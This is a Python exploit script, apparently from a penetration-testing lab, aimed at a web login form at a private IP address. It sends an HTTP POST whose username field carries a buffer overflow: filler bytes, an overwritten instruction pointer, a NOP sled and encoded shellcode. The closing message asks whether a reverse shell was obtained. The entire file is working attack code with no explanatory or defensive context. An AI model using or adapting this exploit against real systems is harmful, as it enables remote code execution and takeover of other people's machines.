#!/usr/bin/python
import socket

try:
  print("\nSending evil buffer...")

  shellcode = b""
  shellcode += b"\xbd\xdf\xc7\x99\xeb\xdb\xdb\xd9\x74\x24\xf4"
  shellcode += b"\x5a\x29\xc9\xb1\x52\x31\x6a\x12\x83\xc2\x04"
  shellcode += b"\x03\xb5\xc9\x7b\x1e\xb5\x3e\xf9\xe1\x45\xbf"
  shellcode += b"\x9e\x68\xa0\x8e\x9e\x0f\xa1\xa1\x2e\x5b\xe7"
  shellcode += b"\x4d\xc4\x09\x13\xc5\xa8\x85\x14\x6e\x06\xf0"
  shellcode += b"\x1b\x6f\x3b\xc0\x3a\xf3\x46\x15\x9c\xca\x88"
  shellcode += b"\x68\xdd\x0b\xf4\x81\x8f\xc4\x72\x37\x3f\x60"
  shellcode += b"\xce\x84\xb4\x3a\xde\x8c\x29\x8a\xe1\xbd\xfc"
  shellcode += b"\x80\xbb\x1d\xff\x45\xb0\x17\xe7\x8a\xfd\xee"
  shellcode += b"\x9c\x79\x89\xf0\x74\xb0\x72\x5e\xb9\x7c\x81"
  shellcode += b"\x9e\xfe\xbb\x7a\xd5\xf6\xbf\x07\xee\xcd\xc2"
  shellcode += b"\xd3\x7b\xd5\x65\x97\xdc\x31\x97\x74\xba\xb2"
  shellcode += b"\x9b\x31\xc8\x9c\xbf\xc4\x1d\x97\xc4\x4d\xa0"
  shellcode += b"\x77\x4d\x15\x87\x53\x15\xcd\xa6\xc2\xf3\xa0"
  shellcode += b"\xd7\x14\x5c\x1c\x72\x5f\x71\x49\x0f\x02\x1e"
  shellcode += b"\xbe\x22\xbc\xde\xa8\x35\xcf\xec\x77\xee\x47"
  shellcode += b"\x5d\xff\x28\x90\xa2\x2a\x8c\x0e\x5d\xd5\xed"
  shellcode += b"\x07\x9a\x81\xbd\x3f\x0b\xaa\x55\xbf\xb4\x7f"
  shellcode += b"\xf9\xef\x1a\xd0\xba\x5f\xdb\x80\x52\xb5\xd4"
  shellcode += b"\xff\x43\xb6\x3e\x68\xe9\x4d\xa9\x57\x46\x60"
  shellcode += b"\xef\x30\x95\x7a\xea\xf9\x10\x9c\x9e\xe9\x74"
  shellcode += b"\x37\x37\x93\xdc\xc3\xa6\x5c\xcb\xae\xe9\xd7"
  shellcode += b"\xf8\x4f\xa7\x1f\x74\x43\x50\xd0\xc3\x39\xf7"
  shellcode += b"\xef\xf9\x55\x9b\x62\x66\xa5\xd2\x9e\x31\xf2"
  shellcode += b"\xb3\x51\x48\x96\x29\xcb\xe2\x84\xb3\x8d\xcd"
  shellcode += b"\x0c\x68\x6e\xd3\x8d\xfd\xca\xf7\x9d\x3b\xd2"
  shellcode += b"\xb3\xc9\x93\x85\x6d\xa7\x55\x7c\xdc\x11\x0c"
  shellcode += b"\xd3\xb6\xf5\xc9\x1f\x09\x83\xd5\x75\xff\x6b"
  shellcode += b"\x67\x20\x46\x94\x48\xa4\x4e\xed\xb4\x54\xb0"
  shellcode += b"\x24\x7d\x74\x53\xec\x88\x1d\xca\x65\x31\x40"
  shellcode += b"\xed\x50\x76\x7d\x6e\x50\x07\x7a\x6e\x11\x02"
  shellcode += b"\xc6\x28\xca\x7e\x57\xdd\xec\x2d\x58\xf4"

  filler = b"A" * 780
  eip = b"\x83\x0c\x09\x10"
  offset = b"C" * 4
  nops = b"\x90" * 10

  inputBuffer = filler + eip + offset + nops + shellcode
  
  content = b"username=" + inputBuffer + b"&password=A"

  buffer = b"POST /login HTTP/1.1\r\n"
  buffer += b"Host: 192.168.198.10\r\n"
  buffer += b"User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
  buffer += b"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
  buffer += b"Accept-Language: en-US,en;q=0.5\r\n"
  buffer += b"Referer: http://192.168.198.10/login\r\n"
  buffer += b"Connection: close\r\n"
  buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"
  buffer += b"Content-Length: "+str(len(content)).encode() + b"\r\n"
  buffer += b"\r\n"
  
  buffer += content

  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
  
  s.connect(("192.168.198.10", 80))
  s.send(buffer)
  
  s.close()
  
  print("\nDone did you get a reverse shell?")
  
except:
  print("\nCould not connect!")